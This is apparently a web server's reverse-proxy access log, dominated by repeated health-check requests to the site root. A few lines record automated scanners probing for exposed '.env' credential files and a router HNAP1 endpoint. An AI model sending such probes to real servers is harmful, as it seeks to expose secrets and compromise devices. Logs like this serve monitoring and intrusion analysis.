167.71.120.76 - - [17/Dec/2023:19:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2204 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:19:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2205 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2206 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:19:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2207 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2208 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:19:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2209 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2210 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:19:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2211 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:19:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2212 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:19:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2213 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:19:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2214 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:19:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2215 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2216 "www@docker" "http://172.18.0.9:80" 0ms
192.142.227.16 - - [17/Dec/2023:19:50:05 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2217 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:19:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2218 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2219 "www@docker" "http://172.18.0.9:80" 0ms
149.50.96.45 - - [17/Dec/2023:19:50:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2220 "web-to-websecure@internal" "-" 0ms
149.50.96.45 - - [17/Dec/2023:19:50:53 +0000] "POST /HNAP1/ HTTP/1.1" 308 18 "-" "-" 2221 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:19:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2222 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:19:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2223 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:19:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2224 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2225 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:19:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2226 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2227 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:19:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2228 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2229 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:19:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2230 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2231 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:19:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2232 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2233 "www@docker" "http://172.18.0.9:80" 0ms
192.155.88.231 - - [17/Dec/2023:19:57:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2234 "-" "-" 0ms
159.203.109.206 - - [17/Dec/2023:19:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2235 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2236 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [17/Dec/2023:19:58:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2237 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:19:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2238 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2239 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:19:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2240 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:19:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2241 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2242 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2243 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2244 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:20:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2245 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2246 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2247 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2248 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2249 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2250 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2251 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2252 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2253 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2254 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2255 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2256 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:20:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2257 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2258 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2259 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2260 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2261 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2262 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:20:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2263 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2264 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2265 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2266 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2267 "www@docker" "http://172.18.0.9:80" 0ms
68.69.186.30 - - [17/Dec/2023:20:13:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2268 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:20:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2269 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2270 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2271 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2272 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2273 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2274 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2275 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2276 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2277 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2278 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2279 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2280 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2281 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2282 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2283 "www@docker" "http://172.18.0.9:80" 0ms
87.236.176.88 - - [17/Dec/2023:20:20:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2284 "-" "-" 0ms
167.71.120.76 - - [17/Dec/2023:20:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2285 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2286 "www@docker" "http://172.18.0.9:80" 1ms
57.129.23.166 - - [17/Dec/2023:20:21:25 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2287 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [17/Dec/2023:20:21:25 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2288 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:20:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2289 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2290 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2291 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2292 "www@docker" "http://172.18.0.9:80" 0ms
61.238.188.50 - - [17/Dec/2023:20:23:32 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2293 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:20:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2294 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2295 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2296 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2297 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:20:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2298 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2299 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [17/Dec/2023:20:26:28 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2300 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [17/Dec/2023:20:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2301 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2302 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2303 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2304 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2305 "www@docker" "http://172.18.0.9:80" 0ms
91.92.243.232 - - [17/Dec/2023:20:28:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2306 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:20:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2307 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2308 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2309 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:20:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2310 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2311 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2312 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2313 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2314 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2315 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:20:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2316 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [17/Dec/2023:20:34:20 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2317 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [17/Dec/2023:20:34:20 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2318 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:20:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2319 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2320 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2321 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2322 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2323 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2324 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2325 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2326 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2327 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2328 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2329 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2330 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2331 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2332 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2333 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2334 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2335 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:20:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2336 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2337 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2338 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2339 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2340 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2341 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2342 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [17/Dec/2023:20:46:05 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2343 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [17/Dec/2023:20:46:07 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2344 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:20:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2345 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:20:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2346 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2347 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2348 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2349 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2350 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2351 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2352 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2353 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2354 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2355 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2356 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2357 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2358 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2359 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2360 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2361 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:20:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2362 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2363 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2364 "www@docker" "http://172.18.0.9:80" 0ms
2.56.247.173 - - [17/Dec/2023:20:56:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2365 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:20:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2366 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2367 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2368 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2369 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:20:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2370 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2371 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:20:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2372 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:20:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2373 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2374 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2375 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2376 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2377 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [17/Dec/2023:21:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2378 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2379 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2380 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2381 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [17/Dec/2023:21:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2382 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [17/Dec/2023:21:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2383 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [17/Dec/2023:21:05:23 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2384 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [17/Dec/2023:21:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2385 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [17/Dec/2023:21:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2386 "www@docker" "http://172.18.0.9:80" 0ms
